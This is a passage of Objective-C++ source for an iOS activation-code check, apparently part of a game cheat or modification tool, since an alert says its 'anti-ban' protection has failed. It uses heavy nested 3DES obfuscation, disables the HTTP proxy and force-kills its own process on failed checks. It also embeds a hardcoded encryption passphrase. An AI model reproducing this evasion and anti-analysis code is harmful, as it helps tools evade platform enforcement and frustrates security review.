                                NSString *re_data = [SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) stringByReplacingOccurrencesOfString:@"<br>" withString:@"\n"];
                                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"维护公告" message:re_data preferredStyle:UIAlertControllerStyleAlert];
                                [alertController addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                        __builtin_trap();
#pragma clang diagnostic pop
                                    });
                                }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                            } else if ([SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:@"2"]) {
                                NSString *re_data = [SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) stringByReplacingOccurrencesOfString:@"<br>" withString:@"\n"];
                                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"更新公告" message:re_data preferredStyle:UIAlertControllerStyleAlert];
                                [alertController addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                        __builtin_trap();
#pragma clang diagnostic pop
                                    });
                                }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                            }
                        });
                    } else {
                        [Loading removeFromSuperview];
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    }
                } else {
                    [Loading removeFromSuperview];
                    if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    }
                    if ([SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) containsString:SpeedDesEn7De(v_yzcgjs)]) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        void (^f)(NSString *s) = arr[6];
                        f(Code_msg);
                        return;
                    } else {
                        if (![md5(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))) isEqualToString:msg[1]]) {
                            [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                            void (^f)(NSString *s) = arr[6];
                            f(Code_msg);
                            return;
                        }
                        void (^f)(NSString *s) = arr[1];
                        f(SpeedDe_3DES(SpeedRebellion_de(msg[0], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                        return;
                    }
                }
            } else {
                [Loading removeFromSuperview];
                void (^f)(NSString *s) = arr[8];
                f(serverTime);
                return;
            }
        } myfailure:^(NSError *error, NSString *serverTime) {
            [Loading removeFromSuperview];
            void (^f)(NSString *s) = arr[7];
            f(serverTime);
            return;
        }];
    };
    
    // 二次验证
    Spv3 = ^(NSString *s) {
        [SpeedBlock disableHttpProxy];
        NSString *Code_msg = s;
        if (Code_msg == nil) {
            Spv0();
            return;
        }
        typedef NSString *  (^EncryptionBlock)(NSString *);
        EncryptionBlock En_3D=^(NSString *s1){return SpeedDesEn7En(s1);};
        NSMutableDictionary *param = [NSMutableDictionary dictionary];
        NSDate *date = [NSDate date];
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        param[@"action"] = En_3D(@"activate");
        [formatter setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
        NSString *appsafecode = [formatter stringFromDate:date];
        param[@"date"] = En_3D([formatter stringFromDate:date]);
                NSString *xulih =SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@",SpeedDe(SpeedhitKeyChain),SpeedDesEn7De(Speed_serial),SpeedApp_IDENTITY]]);
        if (xulih==nil||xulih.length==0) {
                  Spv0();
                  return;
              }
        param[@"one"] = En_3D(xulih);
        param[@"two"] = En_3D(s);
        param[@"id"] = En_3D(md5(SpeedDesEn7De(Speed_appid)));
        param[@"appsafecode"] = En_3D(appsafecode);
        nlohmann::json jsonParam;
        for (NSString *key  in param.allKeys) {
            NSString *value=param[key];
            jsonParam[[key UTF8String]]=[value UTF8String];
        }
        std::string jsonStr=jsonParam.dump();
        NSString *paramJson=[NSString stringWithUTF8String:jsonStr.c_str()];
        NSString *encrypetdParam=En_3D(paramJson);
        
        typedef NSArray* (^UrlToArrayBlock)(NSString *);
        UrlToArrayBlock UrlToarr = ^(NSString *urlString){
            if (!urlString||urlString.length==0)return @[];
            NSURL *url =[NSURL URLWithString:SpeedDesEn7De(urlString)];
            if (!url)return @[];
            NSArray*urlarr=@[url.scheme ?:@"",url.host ?:@"",url.path ?:@""];
            NSString *v0 =SpeedDesEn7En(urlarr[0]);
            NSString *v1 =SpeedDesEn7En(urlarr[1]);
            NSString *v2 =SpeedDesEn7En(urlarr[2]);
            return @[v0,v1,v2];
        };
        NSArray *components =UrlToarr(Speed_HOST);
        
     
        MBProgressHUD *Loading = [MBProgressHUD wj_showActivityLoading];
        [NetTool Post_AppendURL:components encryptedParam:encrypetdParam tag:EN_Spv2 mysuccess:^(id responseObject, NSString *serverTime) {
            if (![SpeedDesEn7De(Speed_HOST) isEqualToString:AsTostr(Speed_ECode, YES)]) {
                [Loading removeFromSuperview];
                [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                void (^f)(NSString *s) = arr[6];
               
                f(Code_msg);
                return;
            }
            NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:responseObject options:NSJSONReadingMutableContainers error:nil];
            if (dict) {
                if ([dict[@"nblaote"] isEqualToString:@"haha"]) {
                    [Loading removeFromSuperview];
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                if (![dict[@"response"][@"appsafecode"] isEqualToString:appsafecode]) {
                    [Loading removeFromSuperview];
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                    void (^f)(NSString *s) = arr[6];
                    f(Code_msg);
                    return;
                }
                // NSString *dataString = dict[@"response"][@"data"];
                NSString *De_EndesString = SpeedDe_3DES(dict[@"response"][@"data"], SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                NSArray *msg = [De_EndesString componentsSeparatedByString:@"|"];
                NSRange range = [De_EndesString rangeOfString:SpeedDesEn7De(v_yzcg)];
                if (range.location != NSNotFound) {
                    if ([md5([NSString stringWithFormat:@"%@%@%@%@%@%@%@%@", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[4], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) isEqualToString:msg[9]] && [msg[0] isEqualToString:SpeedDesEn7De(v_yzcg)]) {
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                        [SpeedKeyChain SpeedSetString:SpeedDesEn7En(dict[@"response"][@"data"]) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_infoData), SpeedApp_IDENTITY]];
                        [Loading removeFromSuperview];
                        NSString* expiresAtStr = SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                         SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                         SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                        NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
                        dateFormatter.dateFormat = @"yyyy-MM-dd HH:mm:ss";
                        NSDate *expiresDate = ParseDateFlexible(expiresAtStr);
                        NSDate *nowDate =  ParseDateFlexible(serverTime);
                        if (!expiresDate || !nowDate) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                             HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                            __builtin_trap();
#pragma clang diagnostic pop
                        }
                        NSTimeInterval diffSeconds = [expiresDate timeIntervalSinceDate:nowDate];
                        NSInteger diffMonths = diffSeconds / (30 * 24 * 3600);
                        if (diffMonths > 18) {
                            [SpeedKeyChain SpeedSetString:SpeedDesEn7En(Code_msg) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
                            void (^f)(NSString *s) = arr[6];
                            
                            f(Code_msg);
                            return;
                        }
                        MBProgressHUD *hud = [MBProgressHUD showHUDAddedTo:[UIApplication sharedApplication].windows[0] animated:YES];
                        hud.mode = MBProgressHUDModeText;
                        hud.labelText = [NSString stringWithFormat:@"%@: %@\n", SpeedDesEn7De(v_yzcgih), SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                        hud.userInteractionEnabled = YES;
                        [hud hide:YES afterDelay:3];
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            if ([SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:@"0"]) {
                                if ([SpeedApp_VERSION isEqualToString:SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))]) {
                                    UIWindow *window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
                                    window.windowLevel = UIWindowLevelAlert;
                                    UIViewController *vc = [UIViewController new];
                                    vc.view.backgroundColor = [UIColor clearColor];
                                    window.rootViewController = vc;
                                    [window makeKeyAndVisible];
                                    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:[NSString stringWithFormat:@"%@%@", SpeedDesEn7De(Speed_name), SpeedDesEn7De(zxgg)] message:[SpeedDe_3DES(SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) stringByReplacingOccurrencesOfString:@"<br>" withString:@"\n"] preferredStyle:UIAlertControllerStyleAlert];
                                    [alertController addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                        window.hidden = YES;
                                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                                            MBProgressHUD *Function = [MBProgressHUD wj_showLoadingStyle:WJHUDLoadingStyleAnnularDeterminate];
                                            [Function showAnimated:YES whileExecutingBlock:^{
                                                float progress = 0.0f;
                                                while (progress < 1.0f) {
                                                    Function.progress = progress;
                                                    Function.labelText = [NSString stringWithFormat:@"%@正在加载%.0f%%", SpeedDesEn7De(Speed_name), progress * 100];
                                                    progress += 0.01f;
                                                    usleep(30000);
                                                }
                                            } completionBlock:^{
                                                HUDGrantOnce();
                                             
                                                int tok=0;
                                                notify_register_check(CHANGED_NAME, &tok);
                                                uint64_t ts =(uint64_t)[expiresDate timeIntervalSince1970];
                                                notify_set_state(tok, (uint64_t)(ts));
                                                notify_post(CHANGED_NAME);
                                                notify_cancel(tok);
                                                
                                                NSString *expireString=[NSString stringWithFormat:@"%@", SpeedDe_3DES(SpeedRebellion_de(msg[1], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))];
                                             
                                                NSError *err = nil;
                                               SaveExpireToICloudEncrypted(expireString, @"HHSSjjBBJSJ^&^&^&^%%&&&&^&^&^&&^7", &err);
                                              
                                                    NSString *mssssg =
                                                        SpeedDe_3DES(
                                                            SpeedRebellion_de(msg[3], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                            SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))),
                                                            SpeedRebellion_de(AsTostr(Speed_ios_giv,  YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))
                                                        );

                                                       

                                                        NSUbiquitousKeyValueStore *kv = [NSUbiquitousKeyValueStore defaultStore];
                                                        [kv setString:mssssg forKey:kSpeedMsgKey];
                                                      
                                                

                                                [MBProgressHUD wj_hideHUD];
                                            }];
                                        });
                                        void (^f)(NSString *s) = arr[5];
                                        f(SpeedDe_3DES(SpeedRebellion_de(msg[8], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))));
                                        return;
                                    }]];
                                    [vc presentViewController:alertController animated:YES completion:nil];
                                } else {
                                    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"此版本防封已失效" message:[NSString stringWithFormat:@"新版本：%@-beta 可升级", SpeedDe_3DES(SpeedRebellion_de(msg[2], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))))] preferredStyle:UIAlertControllerStyleAlert];
                                    [alertController addAction:[UIAlertAction actionWithTitle:@"前往更新" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                        NSString *urlString = SpeedDe_3DES(SpeedRebellion_de(msg[7], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))));
                                        if (urlString == nil || urlString.length == 0) {
                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                __builtin_trap();
#pragma clang diagnostic pop
                                            });
                                            return;
                                        }
                                        NSURL *url = [NSURL URLWithString:urlString];
                                        if (url == nil) {
                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                 HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                __builtin_trap();
#pragma clang diagnostic pop
                                            });
                                            return;
                                        }
                                        [[UIApplication sharedApplication] openURL:url options:@{} completionHandler:^(BOOL success) {
                                            if (!success) {
                                                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                                     HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                                    __builtin_trap();
#pragma clang diagnostic pop
                                                });
                                            }
                                        }];
                                    }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                                }
                            } else if ([SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:@"1"]) {
                                NSString *re_data = [SpeedDe_3DES(SpeedRebellion_de(msg[5], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) stringByReplacingOccurrencesOfString:@"<br>" withString:@"\n"];
                                UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"维护公告" message:re_data preferredStyle:UIAlertControllerStyleAlert];
                                [alertController addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                                        __builtin_trap();
#pragma clang diagnostic pop
                                    });
                                }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                                [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                            } else if ([SpeedDe_3DES(SpeedRebellion_de(msg[6], StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_pass, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES))), SpeedRebellion_de(AsTostr(Speed_ios_giv, YES), StrToArray(AsTostr(Speed_ios_Array, YES)), StrToArray(AsTostr(Speed_ios_Pos, YES)))) isEqualToString:@"2"]) {
